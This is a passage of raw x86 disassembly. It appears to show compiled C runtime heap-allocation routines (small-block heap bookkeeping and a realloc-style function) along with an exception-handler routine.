  425205:	mov    ebx,DWORD PTR [edi+0x4]
  425208:	mov    DWORD PTR [ecx+0x4],ebx
  42520b:	mov    ecx,DWORD PTR [edi+0x4]
  42520e:	mov    edi,DWORD PTR [edi+0x8]
  425211:	mov    DWORD PTR [ecx+0x8],edi
  425214:	mov    ecx,DWORD PTR [ebp+0x10]
  425217:	sub    ecx,esi
  425219:	add    DWORD PTR [ebp-0x4],ecx
  42521c:	cmp    DWORD PTR [ebp-0x4],0x0
  425220:	jle    0x4252cb
  425226:	mov    edi,DWORD PTR [ebp-0x4]
  425229:	mov    ecx,DWORD PTR [ebp+0xc]
  42522c:	sar    edi,0x4
  42522f:	dec    edi
  425230:	cmp    edi,0x3f
  425233:	lea    ecx,[ecx+esi*1-0x4]
  425237:	jbe    0x42523c
  425239:	push   0x3f
  42523b:	pop    edi
  42523c:	mov    ebx,DWORD PTR [ebp-0xc]
  42523f:	lea    ebx,[ebx+edi*8]
  425242:	mov    DWORD PTR [ebp+0x10],ebx
  425245:	mov    ebx,DWORD PTR [ebx+0x4]
  425248:	mov    DWORD PTR [ecx+0x4],ebx
  42524b:	mov    ebx,DWORD PTR [ebp+0x10]
  42524e:	mov    DWORD PTR [ecx+0x8],ebx
  425251:	mov    DWORD PTR [ebx+0x4],ecx
  425254:	mov    ebx,DWORD PTR [ecx+0x4]
  425257:	mov    DWORD PTR [ebx+0x8],ecx
  42525a:	mov    ebx,DWORD PTR [ecx+0x4]
  42525d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425260:	jne    0x4252b9
  425262:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425266:	mov    BYTE PTR [ebp+0x13],cl
  425269:	inc    cl
  42526b:	cmp    edi,0x20
  42526e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425272:	jae    0x425290
  425274:	cmp    BYTE PTR [ebp+0x13],0x0
  425278:	jne    0x425288
  42527a:	mov    ecx,edi
  42527c:	mov    ebx,0x80000000
  425281:	shr    ebx,cl
  425283:	mov    ecx,DWORD PTR [ebp+0x8]
  425286:	or     DWORD PTR [ecx],ebx
  425288:	lea    eax,[eax+edx*4+0x44]
  42528c:	mov    ecx,edi
  42528e:	jmp    0x4252b0
  425290:	cmp    BYTE PTR [ebp+0x13],0x0
  425294:	jne    0x4252a6
  425296:	lea    ecx,[edi-0x20]
  425299:	mov    ebx,0x80000000
  42529e:	shr    ebx,cl
  4252a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252a3:	or     DWORD PTR [ecx+0x4],ebx
  4252a6:	lea    eax,[eax+edx*4+0xc4]
  4252ad:	lea    ecx,[edi-0x20]
  4252b0:	mov    edx,0x80000000
  4252b5:	shr    edx,cl
  4252b7:	or     DWORD PTR [eax],edx
  4252b9:	mov    edx,DWORD PTR [ebp+0xc]
  4252bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252bf:	lea    eax,[edx+esi*1-0x4]
  4252c3:	mov    DWORD PTR [eax],ecx
  4252c5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4252c9:	jmp    0x4252ce
  4252cb:	mov    edx,DWORD PTR [ebp+0xc]
  4252ce:	lea    eax,[esi+0x1]
  4252d1:	mov    DWORD PTR [edx-0x4],eax
  4252d4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4252d8:	jmp    0x425419
  4252dd:	xor    eax,eax
  4252df:	jmp    0x42541c
  4252e4:	jge    0x425419
  4252ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ed:	sub    DWORD PTR [ebp+0x10],esi
  4252f0:	lea    ecx,[esi+0x1]
  4252f3:	mov    DWORD PTR [ebx-0x4],ecx
  4252f6:	lea    ebx,[ebx+esi*1-0x4]
  4252fa:	mov    esi,DWORD PTR [ebp+0x10]
  4252fd:	sar    esi,0x4
  425300:	dec    esi
  425301:	cmp    esi,0x3f
  425304:	mov    DWORD PTR [ebp+0xc],ebx
  425307:	mov    DWORD PTR [ebx-0x4],ecx
  42530a:	jbe    0x42530f
  42530c:	push   0x3f
  42530e:	pop    esi
  42530f:	test   BYTE PTR [ebp-0x4],0x1
  425313:	jne    0x425399
  425319:	mov    esi,DWORD PTR [ebp-0x4]
  42531c:	sar    esi,0x4
  42531f:	dec    esi
  425320:	cmp    esi,0x3f
  425323:	jbe    0x425328
  425325:	push   0x3f
  425327:	pop    esi
  425328:	mov    ecx,DWORD PTR [edi+0x4]
  42532b:	cmp    ecx,DWORD PTR [edi+0x8]
  42532e:	jne    0x425372
  425330:	cmp    esi,0x20
  425333:	mov    ebx,0x80000000
  425338:	jae    0x425353
  42533a:	mov    ecx,esi
  42533c:	shr    ebx,cl
  42533e:	lea    esi,[esi+eax*1+0x4]
  425342:	not    ebx
  425344:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425348:	dec    BYTE PTR [esi]
  42534a:	jne    0x42536f
  42534c:	mov    ecx,DWORD PTR [ebp+0x8]
  42534f:	and    DWORD PTR [ecx],ebx
  425351:	jmp    0x42536f
  425353:	lea    ecx,[esi-0x20]
  425356:	shr    ebx,cl
  425358:	lea    ecx,[esi+eax*1+0x4]
  42535c:	not    ebx
  42535e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425365:	dec    BYTE PTR [ecx]
  425367:	jne    0x42536f
  425369:	mov    ecx,DWORD PTR [ebp+0x8]
  42536c:	and    DWORD PTR [ecx+0x4],ebx
  42536f:	mov    ebx,DWORD PTR [ebp+0xc]
  425372:	mov    ecx,DWORD PTR [edi+0x8]
  425375:	mov    esi,DWORD PTR [edi+0x4]
  425378:	mov    DWORD PTR [ecx+0x4],esi
  42537b:	mov    esi,DWORD PTR [edi+0x8]
  42537e:	mov    ecx,DWORD PTR [edi+0x4]
  425381:	mov    DWORD PTR [ecx+0x8],esi
  425384:	mov    esi,DWORD PTR [ebp+0x10]
  425387:	add    esi,DWORD PTR [ebp-0x4]
  42538a:	mov    DWORD PTR [ebp+0x10],esi
  42538d:	sar    esi,0x4
  425390:	dec    esi
  425391:	cmp    esi,0x3f
  425394:	jbe    0x425399
  425396:	push   0x3f
  425398:	pop    esi
  425399:	mov    ecx,DWORD PTR [ebp-0xc]
  42539c:	lea    ecx,[ecx+esi*8]
  42539f:	mov    edi,DWORD PTR [ecx+0x4]
  4253a2:	mov    DWORD PTR [ebx+0x8],ecx
  4253a5:	mov    DWORD PTR [ebx+0x4],edi
  4253a8:	mov    DWORD PTR [ecx+0x4],ebx
  4253ab:	mov    ecx,DWORD PTR [ebx+0x4]
  4253ae:	mov    DWORD PTR [ecx+0x8],ebx
  4253b1:	mov    ecx,DWORD PTR [ebx+0x4]
  4253b4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4253b7:	jne    0x425410
  4253b9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4253bd:	mov    BYTE PTR [ebp+0xf],cl
  4253c0:	inc    cl
  4253c2:	cmp    esi,0x20
  4253c5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4253c9:	jae    0x4253e7
  4253cb:	cmp    BYTE PTR [ebp+0xf],0x0
  4253cf:	jne    0x4253df
  4253d1:	mov    ecx,esi
  4253d3:	mov    edi,0x80000000
  4253d8:	shr    edi,cl
  4253da:	mov    ecx,DWORD PTR [ebp+0x8]
  4253dd:	or     DWORD PTR [ecx],edi
  4253df:	lea    eax,[eax+edx*4+0x44]
  4253e3:	mov    ecx,esi
  4253e5:	jmp    0x425407
  4253e7:	cmp    BYTE PTR [ebp+0xf],0x0
  4253eb:	jne    0x4253fd
  4253ed:	lea    ecx,[esi-0x20]
  4253f0:	mov    edi,0x80000000
  4253f5:	shr    edi,cl
  4253f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4253fa:	or     DWORD PTR [ecx+0x4],edi
  4253fd:	lea    eax,[eax+edx*4+0xc4]
  425404:	lea    ecx,[esi-0x20]
  425407:	mov    edx,0x80000000
  42540c:	shr    edx,cl
  42540e:	or     DWORD PTR [eax],edx
  425410:	mov    eax,DWORD PTR [ebp+0x10]
  425413:	mov    DWORD PTR [ebx],eax
  425415:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425419:	xor    eax,eax
  42541b:	inc    eax
  42541c:	pop    edi
  42541d:	pop    esi
  42541e:	pop    ebx
  42541f:	leave  
  425420:	ret    
  425421:	push   ebp
  425422:	mov    ebp,esp
  425424:	sub    esp,0x14
  425427:	mov    ecx,DWORD PTR [ebp+0x8]
  42542a:	mov    eax,ds:0x45cefc
  42542f:	mov    edx,DWORD PTR ds:0x45cf00
  425435:	add    ecx,0x17
  425438:	and    ecx,0xfffffff0
  42543b:	push   ebx
  42543c:	mov    DWORD PTR [ebp-0x10],ecx
  42543f:	sar    ecx,0x4
  425442:	push   esi
  425443:	lea    eax,[eax+eax*4]
  425446:	push   edi
  425447:	dec    ecx
  425448:	cmp    ecx,0x20
  42544b:	lea    edi,[edx+eax*4]
  42544e:	mov    DWORD PTR [ebp-0x4],edi
  425451:	jge    0x42545e
  425453:	or     esi,0xffffffff
  425456:	shr    esi,cl
  425458:	or     DWORD PTR [ebp-0x8],0xffffffff
  42545c:	jmp    0x42546b
  42545e:	add    ecx,0xffffffe0
  425461:	or     eax,0xffffffff
  425464:	xor    esi,esi
  425466:	shr    eax,cl
  425468:	mov    DWORD PTR [ebp-0x8],eax
  42546b:	mov    eax,ds:0x45cf08
  425470:	mov    ebx,eax
  425472:	mov    DWORD PTR [ebp-0xc],esi
  425475:	cmp    ebx,edi
  425477:	jmp    0x42548d
  425479:	mov    ecx,DWORD PTR [ebx+0x4]
  42547c:	mov    edi,DWORD PTR [ebx]
  42547e:	and    ecx,DWORD PTR [ebp-0x8]
  425481:	and    edi,esi
  425483:	or     ecx,edi
  425485:	jne    0x425492
  425487:	add    ebx,0x14
  42548a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42548d:	mov    DWORD PTR [ebp+0x8],ebx
  425490:	jb     0x425479
  425492:	cmp    ebx,DWORD PTR [ebp-0x4]
  425495:	jne    0x4254bb
  425497:	mov    ebx,edx
  425499:	jmp    0x4254ac
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    edi,DWORD PTR [ebx]
  4254a0:	and    ecx,DWORD PTR [ebp-0x8]
  4254a3:	and    edi,esi
  4254a5:	or     ecx,edi
  4254a7:	jne    0x4254b3
  4254a9:	add    ebx,0x14
  4254ac:	cmp    ebx,eax
  4254ae:	mov    DWORD PTR [ebp+0x8],ebx
  4254b1:	jb     0x42549b
  4254b3:	cmp    ebx,eax
  4254b5:	je     0x42554f
  4254bb:	mov    DWORD PTR ds:0x45cf08,ebx
  4254c1:	mov    eax,DWORD PTR [ebx+0x10]
  4254c4:	mov    edx,DWORD PTR [eax]
  4254c6:	cmp    edx,0xffffffff
  4254c9:	mov    DWORD PTR [ebp-0x4],edx
  4254cc:	je     0x4254e2
  4254ce:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4254d5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4254d9:	and    ecx,DWORD PTR [ebp-0x8]
  4254dc:	and    edi,esi
  4254de:	or     ecx,edi
  4254e0:	jne    0x425518
  4254e2:	mov    edx,DWORD PTR [eax+0xc4]
  4254e8:	and    edx,DWORD PTR [ebp-0x8]
  4254eb:	and    DWORD PTR [ebp-0x4],0x0
  4254ef:	lea    ecx,[eax+0x44]
  4254f2:	mov    esi,DWORD PTR [ecx]
  4254f4:	and    esi,DWORD PTR [ebp-0xc]
  4254f7:	or     edx,esi
  4254f9:	mov    esi,DWORD PTR [ebp-0xc]
  4254fc:	jne    0x425515
  4254fe:	mov    edx,DWORD PTR [ecx+0x84]
  425504:	and    edx,DWORD PTR [ebp-0x8]
  425507:	inc    DWORD PTR [ebp-0x4]
  42550a:	add    ecx,0x4
  42550d:	mov    edi,DWORD PTR [ecx]
  42550f:	and    edi,esi
  425511:	or     edx,edi
  425513:	je     0x4254fe
  425515:	mov    edx,DWORD PTR [ebp-0x4]
  425518:	mov    ecx,edx
  42551a:	imul   ecx,ecx,0x204
  425520:	lea    ecx,[ecx+eax*1+0x144]
  425527:	mov    DWORD PTR [ebp-0xc],ecx
  42552a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42552e:	xor    edi,edi
  425530:	and    ecx,esi
  425532:	jne    0x4255a1
  425534:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42553b:	and    ecx,DWORD PTR [ebp-0x8]
  42553e:	push   0x20
  425540:	pop    edi
  425541:	jmp    0x4255a1
  425543:	cmp    DWORD PTR [ebx+0x8],0x0
  425547:	jne    0x425554
  425549:	add    ebx,0x14
  42554c:	mov    DWORD PTR [ebp+0x8],ebx
  42554f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425552:	jb     0x425543
  425554:	cmp    ebx,DWORD PTR [ebp-0x4]
  425557:	jne    0x42557f
  425559:	mov    ebx,edx
  42555b:	jmp    0x425566
  42555d:	cmp    DWORD PTR [ebx+0x8],0x0
  425561:	jne    0x42556d
  425563:	add    ebx,0x14
  425566:	cmp    ebx,eax
  425568:	mov    DWORD PTR [ebp+0x8],ebx
  42556b:	jb     0x42555d
  42556d:	cmp    ebx,eax
  42556f:	jne    0x42557f
  425571:	call   0x424f85
  425576:	mov    ebx,eax
  425578:	test   ebx,ebx
  42557a:	mov    DWORD PTR [ebp+0x8],ebx
  42557d:	je     0x425597
  42557f:	push   ebx
  425580:	call   0x42503c
  425585:	pop    ecx
  425586:	mov    ecx,DWORD PTR [ebx+0x10]
  425589:	mov    DWORD PTR [ecx],eax
  42558b:	mov    eax,DWORD PTR [ebx+0x10]
  42558e:	cmp    DWORD PTR [eax],0xffffffff
  425591:	jne    0x4254bb
  425597:	xor    eax,eax
  425599:	jmp    0x425718
  42559e:	shl    ecx,1
  4255a0:	inc    edi
  4255a1:	test   ecx,ecx
  4255a3:	jge    0x42559e
  4255a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255a8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255ac:	mov    ecx,DWORD PTR [edx]
  4255ae:	sub    ecx,DWORD PTR [ebp-0x10]
  4255b1:	mov    esi,ecx
  4255b3:	sar    esi,0x4
  4255b6:	dec    esi
  4255b7:	cmp    esi,0x3f
  4255ba:	mov    DWORD PTR [ebp-0x8],ecx
  4255bd:	jle    0x4255c2
  4255bf:	push   0x3f
  4255c1:	pop    esi
  4255c2:	cmp    esi,edi
  4255c4:	je     0x4256cb
  4255ca:	mov    ecx,DWORD PTR [edx+0x4]
  4255cd:	cmp    ecx,DWORD PTR [edx+0x8]
  4255d0:	jne    0x42562e
  4255d2:	cmp    edi,0x20
  4255d5:	mov    ebx,0x80000000
  4255da:	jge    0x425602
  4255dc:	mov    ecx,edi
  4255de:	shr    ebx,cl
  4255e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4255e3:	lea    edi,[eax+edi*1+0x4]
  4255e7:	not    ebx
  4255e9:	mov    DWORD PTR [ebp-0x14],ebx
  4255ec:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4255f0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4255f4:	dec    BYTE PTR [edi]
  4255f6:	jne    0x42562b
  4255f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4255fe:	and    DWORD PTR [ebx],ecx
  425600:	jmp    0x42562e
  425602:	lea    ecx,[edi-0x20]
  425605:	shr    ebx,cl
  425607:	mov    ecx,DWORD PTR [ebp-0x4]
  42560a:	lea    ecx,[eax+ecx*4+0xc4]
  425611:	lea    edi,[eax+edi*1+0x4]
  425615:	not    ebx
  425617:	and    DWORD PTR [ecx],ebx
  425619:	dec    BYTE PTR [edi]
  42561b:	mov    DWORD PTR [ebp-0x14],ebx
  42561e:	jne    0x42562b
  425620:	mov    ebx,DWORD PTR [ebp+0x8]
  425623:	mov    ecx,DWORD PTR [ebp-0x14]
  425626:	and    DWORD PTR [ebx+0x4],ecx
  425629:	jmp    0x42562e
  42562b:	mov    ebx,DWORD PTR [ebp+0x8]
  42562e:	cmp    DWORD PTR [ebp-0x8],0x0
  425632:	mov    ecx,DWORD PTR [edx+0x8]
  425635:	mov    edi,DWORD PTR [edx+0x4]
  425638:	mov    DWORD PTR [ecx+0x4],edi
  42563b:	mov    ecx,DWORD PTR [edx+0x4]
  42563e:	mov    edi,DWORD PTR [edx+0x8]
  425641:	mov    DWORD PTR [ecx+0x8],edi
  425644:	je     0x4256d7
  42564a:	mov    ecx,DWORD PTR [ebp-0xc]
  42564d:	lea    ecx,[ecx+esi*8]
  425650:	mov    edi,DWORD PTR [ecx+0x4]
  425653:	mov    DWORD PTR [edx+0x8],ecx
  425656:	mov    DWORD PTR [edx+0x4],edi
  425659:	mov    DWORD PTR [ecx+0x4],edx
  42565c:	mov    ecx,DWORD PTR [edx+0x4]
  42565f:	mov    DWORD PTR [ecx+0x8],edx
  425662:	mov    ecx,DWORD PTR [edx+0x4]
  425665:	cmp    ecx,DWORD PTR [edx+0x8]
  425668:	jne    0x4256c8
  42566a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42566e:	mov    BYTE PTR [ebp+0xb],cl
  425671:	inc    cl
  425673:	cmp    esi,0x20
  425676:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42567a:	jge    0x42569f
  42567c:	cmp    BYTE PTR [ebp+0xb],0x0
  425680:	jne    0x42568d
  425682:	mov    edi,0x80000000
  425687:	mov    ecx,esi
  425689:	shr    edi,cl
  42568b:	or     DWORD PTR [ebx],edi
  42568d:	mov    ecx,esi
  42568f:	mov    edi,0x80000000
  425694:	shr    edi,cl
  425696:	mov    ecx,DWORD PTR [ebp-0x4]
  425699:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42569d:	jmp    0x4256c8
  42569f:	cmp    BYTE PTR [ebp+0xb],0x0
  4256a3:	jne    0x4256b2
  4256a5:	lea    ecx,[esi-0x20]
  4256a8:	mov    edi,0x80000000
  4256ad:	shr    edi,cl
  4256af:	or     DWORD PTR [ebx+0x4],edi
  4256b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b5:	lea    edi,[eax+ecx*4+0xc4]
  4256bc:	lea    ecx,[esi-0x20]
  4256bf:	mov    esi,0x80000000
  4256c4:	shr    esi,cl
  4256c6:	or     DWORD PTR [edi],esi
  4256c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4256cb:	test   ecx,ecx
  4256cd:	je     0x4256da
  4256cf:	mov    DWORD PTR [edx],ecx
  4256d1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4256d5:	jmp    0x4256da
  4256d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4256da:	mov    esi,DWORD PTR [ebp-0x10]
  4256dd:	add    edx,ecx
  4256df:	lea    ecx,[esi+0x1]
  4256e2:	mov    DWORD PTR [edx],ecx
  4256e4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4256e8:	mov    esi,DWORD PTR [ebp-0xc]
  4256eb:	mov    ecx,DWORD PTR [esi]
  4256ed:	test   ecx,ecx
  4256ef:	lea    edi,[ecx+0x1]
  4256f2:	mov    DWORD PTR [esi],edi
  4256f4:	jne    0x425710
  4256f6:	cmp    ebx,DWORD PTR ds:0x45cef8
  4256fc:	jne    0x425710
  4256fe:	mov    ecx,DWORD PTR [ebp-0x4]
  425701:	cmp    ecx,DWORD PTR ds:0x45cf10
  425707:	jne    0x425710
  425709:	and    DWORD PTR ds:0x45cef8,0x0
  425710:	mov    ecx,DWORD PTR [ebp-0x4]
  425713:	mov    DWORD PTR [eax],ecx
  425715:	lea    eax,[edx+0x4]
  425718:	pop    edi
  425719:	pop    esi
  42571a:	pop    ebx
  42571b:	leave  
  42571c:	ret    
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   esi
  425721:	inc    ebx
  425722:	xor    dh,BYTE PTR [eax]
  425724:	pop    eax
  425725:	inc    ebx
  425726:	xor    BYTE PTR [eax],dh
  425728:	push   ebp
  425729:	mov    ebp,esp
  42572b:	sub    esp,0x8
  42572e:	push   ebx
  42572f:	push   esi
  425730:	push   edi
  425731:	push   ebp
  425732:	cld    
  425733:	mov    ebx,DWORD PTR [ebp+0xc]
  425736:	mov    eax,DWORD PTR [ebp+0x8]
  425739:	test   DWORD PTR [eax+0x4],0x6
  425740:	jne    0x4257c8
  425746:	mov    DWORD PTR [ebp-0x8],eax
  425749:	mov    eax,DWORD PTR [ebp+0x10]
  42574c:	mov    DWORD PTR [ebp-0x4],eax
  42574f:	lea    eax,[ebp-0x8]
  425752:	mov    DWORD PTR [ebx-0x4],eax
  425755:	mov    esi,DWORD PTR [ebx+0xc]
  425758:	mov    edi,DWORD PTR [ebx+0x8]
  42575b:	cmp    esi,0xffffffff
  42575e:	je     0x4257c1
  425760:	lea    ecx,[esi+esi*2]
  425763:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425768:	je     0x4257af
  42576a:	push   esi
  42576b:	push   ebp
  42576c:	lea    ebp,[ebx+0x10]
  42576f:	call   DWORD PTR [edi+ecx*4+0x4]
  425773:	pop    ebp
  425774:	pop    esi
  425775:	mov    ebx,DWORD PTR [ebp+0xc]
  425778:	or     eax,eax
  42577a:	je     0x4257af
  42577c:	js     0x4257ba
  42577e:	mov    edi,DWORD PTR [ebx+0x8]
  425781:	push   ebx
  425782:	call   0x4266b0
  425787:	add    esp,0x4
  42578a:	lea    ebp,[ebx+0x10]
  42578d:	push   esi
  42578e:	push   ebx
  42578f:	call   0x4266f2
  425794:	add    esp,0x8
  425797:	lea    ecx,[esi+esi*2]
  42579a:	push   0x1
  42579c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257a0:	call   0x426786
  4257a5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257a8:	mov    DWORD PTR [ebx+0xc],eax
  4257ab:	call   DWORD PTR [edi+ecx*4+0x8]
  4257af:	mov    edi,DWORD PTR [ebx+0x8]
  4257b2:	lea    ecx,[esi+esi*2]
  4257b5:	mov    esi,DWORD PTR [edi+ecx*4]
  4257b8:	jmp    0x42575b
  4257ba:	mov    eax,0x0
  4257bf:	jmp    0x4257dd
  4257c1:	mov    eax,0x1
  4257c6:	jmp    0x4257dd
  4257c8:	push   ebp
  4257c9:	lea    ebp,[ebx+0x10]
  4257cc:	push   0xffffffff
  4257ce:	push   ebx
  4257cf:	call   0x4266f2
  4257d4:	add    esp,0x8
  4257d7:	pop    ebp
  4257d8:	mov    eax,0x1
  4257dd:	pop    ebp
  4257de:	pop    edi
  4257df:	pop    esi
  4257e0:	pop    ebx
  4257e1:	mov    esp,ebp
  4257e3:	pop    ebp
  4257e4:	ret    
  4257e5:	push   ebp
  4257e6:	mov    ecx,DWORD PTR [esp+0x8]
  4257ea:	mov    ebp,DWORD PTR [ecx]
  4257ec:	mov    eax,DWORD PTR [ecx+0x1c]
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ecx+0x18]
  4257f3:	push   eax
  4257f4:	call   0x4266f2
  4257f9:	add    esp,0x8
  4257fc:	pop    ebp
  4257fd:	ret    0x4
  425800:	call   0x42370d
  425805:	add    eax,0x8
  425808:	ret    
  425809:	push   0x14
  42580b:	push   0x428768
  425810:	call   0x423858
  425815:	mov    edi,DWORD PTR [ebp+0x8]
  425818:	xor    ebx,ebx
  42581a:	cmp    edi,ebx
  42581c:	jne    0x42582c
  42581e:	push   DWORD PTR [ebp+0xc]
  425821:	call   0x424582
  425826:	pop    ecx
  425827:	jmp    0x4259b0
  42582c:	mov    esi,DWORD PTR [ebp+0xc]
  42582f:	cmp    esi,ebx
  425831:	jne    0x42583f
  425833:	push   edi
  425834:	call   0x42446a
  425839:	pop    ecx
  42583a:	jmp    0x4259ae
  42583f:	cmp    DWORD PTR ds:0x45d144,0x3
  425846:	jne    0x42597a
  42584c:	mov    DWORD PTR [ebp-0x1c],ebx
  42584f:	cmp    esi,0xffffffe0
  425852:	ja     0x425949
  425858:	push   0x4
  42585a:	call   0x423a1f
  42585f:	pop    ecx
  425860:	mov    DWORD PTR [ebp-0x4],ebx
  425863:	push   edi
  425864:	call   0x424c42
  425869:	pop    ecx
  42586a:	mov    DWORD PTR [ebp-0x20],eax
  42586d:	cmp    eax,ebx
  42586f:	je     0x425919
  425875:	cmp    esi,DWORD PTR ds:0x45cf04
  42587b:	ja     0x4258c9
  42587d:	push   esi
  42587e:	push   edi
  42587f:	push   eax
  425880:	call   0x425142
  425885:	add    esp,0xc
  425888:	test   eax,eax
  42588a:	je     0x425891
  42588c:	mov    DWORD PTR [ebp-0x1c],edi
  42588f:	jmp    0x4258c9
  425891:	push   esi
  425892:	call   0x425421
  425897:	pop    ecx
  425898:	mov    DWORD PTR [ebp-0x1c],eax
  42589b:	cmp    eax,ebx
  42589d:	je     0x4258c9
  42589f:	mov    eax,DWORD PTR [edi-0x4]
  4258a2:	dec    eax
  4258a3:	mov    DWORD PTR [ebp-0x24],eax
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x4258ac
  4258aa:	mov    eax,esi
  4258ac:	push   eax
  4258ad:	push   edi
  4258ae:	push   DWORD PTR [ebp-0x1c]
  4258b1:	call   0x4245a0
  4258b6:	push   edi
  4258b7:	call   0x424c42
  4258bc:	mov    DWORD PTR [ebp-0x20],eax
  4258bf:	push   edi
  4258c0:	push   eax
  4258c1:	call   0x424c6d
  4258c6:	add    esp,0x18
  4258c9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4258cc:	jne    0x425919
  4258ce:	cmp    esi,ebx
  4258d0:	jne    0x4258d8
  4258d2:	xor    esi,esi
  4258d4:	inc    esi
  4258d5:	mov    DWORD PTR [ebp+0xc],esi
  4258d8:	add    esi,0xf
  4258db:	and    esi,0xfffffff0
  4258de:	mov    DWORD PTR [ebp+0xc],esi
  4258e1:	push   esi
  4258e2:	push   ebx
  4258e3:	push   DWORD PTR ds:0x45d140
  4258e9:	call   DWORD PTR ds:0x4280a4
  4258ef:	mov    DWORD PTR [ebp-0x1c],eax
  4258f2:	cmp    eax,ebx
  4258f4:	je     0x425919
  4258f6:	mov    eax,DWORD PTR [edi-0x4]
  4258f9:	dec    eax
  4258fa:	mov    DWORD PTR [ebp-0x24],eax
  4258fd:	cmp    eax,esi
  4258ff:	jb     0x425903
  425901:	mov    eax,esi
  425903:	push   eax
  425904:	push   edi
  425905:	push   DWORD PTR [ebp-0x1c]
  425908:	call   0x4245a0
  42590d:	push   edi
  42590e:	push   DWORD PTR [ebp-0x20]
  425911:	call   0x424c6d
  425916:	add    esp,0x14
  425919:	or     DWORD PTR [ebp-0x4],0xffffffff
  42591d:	call   0x425971
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jne    0x425949
  425927:	cmp    esi,ebx
  425929:	jne    0x42592e
  42592b:	xor    esi,esi
  42592d:	inc    esi
  42592e:	add    esi,0xf
  425931:	and    esi,0xfffffff0
  425934:	mov    DWORD PTR [ebp+0xc],esi
  425937:	push   esi
  425938:	push   edi
  425939:	push   ebx
  42593a:	push   DWORD PTR ds:0x45d140
  425940:	call   DWORD PTR ds:0x4280b0
  425946:	mov    DWORD PTR [ebp-0x1c],eax
  425949:	mov    eax,DWORD PTR [ebp-0x1c]
  42594c:	cmp    eax,ebx
  42594e:	jne    0x4259b0
  425950:	cmp    DWORD PTR ds:0x45cdc8,ebx
  425956:	je     0x4259b0
  425958:	push   esi
  425959:	call   0x426142
  42595e:	pop    ecx
  42595f:	test   eax,eax
  425961:	jne    0x42584c
  425967:	jmp    0x4259ae
  425969:	xor    ebx,ebx
  42596b:	mov    esi,DWORD PTR [ebp+0xc]
  42596e:	mov    edi,DWORD PTR [ebp+0x8]
  425971:	push   0x4
  425973:	call   0x42398b
  425978:	pop    ecx
  425979:	ret    
  42597a:	xor    eax,eax
  42597c:	cmp    esi,0xffffffe0
  42597f:	ja     0x425997
  425981:	cmp    esi,ebx
  425983:	jne    0x425988
  425985:	xor    esi,esi
  425987:	inc    esi
  425988:	push   esi
  425989:	push   edi
  42598a:	push   ebx
  42598b:	push   DWORD PTR ds:0x45d140
  425991:	call   DWORD PTR ds:0x4280b0
  425997:	cmp    eax,ebx
  425999:	jne    0x4259b0
  42599b:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a1:	je     0x4259b0
  4259a3:	push   esi
  4259a4:	call   0x426142
  4259a9:	pop    ecx
  4259aa:	test   eax,eax
  4259ac:	jne    0x42597a
  4259ae:	xor    eax,eax
  4259b0:	call   0x423893
  4259b5:	ret    
  4259b6:	push   0x10
  4259b8:	push   0x428778
  4259bd:	call   0x423858
  4259c2:	cmp    DWORD PTR ds:0x45d144,0x3
  4259c9:	jne    0x425a05
  4259cb:	push   0x4
  4259cd:	call   0x423a1f
  4259d2:	pop    ecx
  4259d3:	and    DWORD PTR [ebp-0x4],0x0
  4259d7:	mov    esi,DWORD PTR [ebp+0x8]
  4259da:	push   esi
  4259db:	call   0x424c42
  4259e0:	pop    ecx
  4259e1:	mov    DWORD PTR [ebp-0x1c],eax
  4259e4:	test   eax,eax
  4259e6:	je     0x4259f3
  4259e8:	mov    esi,DWORD PTR [esi-0x4]
  4259eb:	sub    esi,0x9
  4259ee:	mov    DWORD PTR [ebp-0x20],esi
  4259f1:	jmp    0x4259f6
  4259f3:	mov    esi,DWORD PTR [ebp-0x20]
  4259f6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fa:	call   0x425a23
  4259ff:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a03:	jne    0x425a18
  425a05:	push   DWORD PTR [ebp+0x8]
  425a08:	push   0x0
  425a0a:	push   DWORD PTR ds:0x45d140
  425a10:	call   DWORD PTR ds:0x4280b4
